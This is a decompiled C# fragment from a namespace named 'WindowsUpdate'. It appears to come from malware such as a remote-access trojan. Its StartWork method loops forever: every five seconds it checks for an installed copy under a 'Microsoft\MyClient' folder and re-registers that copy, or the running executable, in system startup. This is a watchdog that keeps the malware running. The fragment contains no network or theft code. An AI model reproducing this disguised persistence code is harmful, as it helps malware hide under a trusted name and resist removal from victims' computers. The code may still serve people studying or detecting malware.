using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsUpdate;

[StandardModule]
internal sealed class StartEvrey
{
	public static void StartWork()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_007f;
				case 227:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 4:
						case 5:
							goto IL_000b;
						case 6:
							goto IL_0013;
						case 7:
							goto IL_001f;
						case 8:
							goto IL_0042;
						case 10:
							goto IL_006a;
						case 11:
							goto IL_006d;
						case 2:
						case 9:
						case 12:
						case 13:
							goto IL_007f;
						default:
							goto end_IL_0001;
						case 3:
						case 14:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_006d:
					num = 11;
					Exta.AStartup(A.startUP, Application.get_ExecutablePath());
					goto IL_007f;
					IL_006a:
					num = 10;
					goto IL_006d;
					IL_007f:
					num = 2;
					if (A.st != 0)
					{
						goto end_IL_0001_2;
					}
					goto IL_000b;
					IL_000b:
					num = 5;
					text = "Microsoft\\MyClient";
					goto IL_0013;
					IL_0013:
					num = 6;
					Thread.Sleep(5000);
					goto IL_001f;
					IL_001f:
					num = 7;
					if (File.Exists(Interaction.Environ(A.PathS) + "\\" + text + A.InstallName))
					{
						goto IL_0042;
					}
					goto IL_006a;
					IL_0042:
					num = 8;
					Exta.AStartup(A.startUP, Interaction.Environ(A.PathS) + "\\" + text + A.InstallName);
					goto IL_007f;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 227;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
